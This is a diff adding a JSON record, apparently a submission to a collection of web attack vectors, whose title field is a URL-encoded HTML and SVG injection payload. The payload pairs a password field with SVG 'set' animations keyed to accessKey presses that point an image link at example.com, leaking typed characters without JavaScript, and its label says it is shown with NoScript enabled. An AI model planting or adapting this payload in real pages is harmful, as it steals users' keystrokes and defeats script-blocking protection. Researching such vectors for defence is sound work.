@@ -1,0 +1,8 @@
+{
+  "title": "%3c!doctype%20html%3e%3cform%3e%3clabel%3etype%20a,b,c,d%20-%20watch%20the%20network%20tab%2ftraffic%20(JS%20is%20off,%20latest%20NoScript)%3c%2flabel%3e%3cbr%3e%3cinput%20name%3d%22secret%22%20type%3d%22password%22%3e%3c%2fform%3e%3c!--%20injection%20--%3e%3csvg%20height%3d%2250px%22%3e%3cimage%20xmlns%3axlink%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%22%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(a)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fa%22%20%2f%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(b)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fb%22%20%2f%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(c)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fc%22%20%2f%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(d)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fd%22%20%2f%3e%3c%2fimage%3e%3c%2fsvg%3e",
+  "author": {
+    "name": "Pieere"
+  },
+  "url": "http://google.com",
+  "submittedOn": "2023-01-25T10:07:52.328Z"
+}
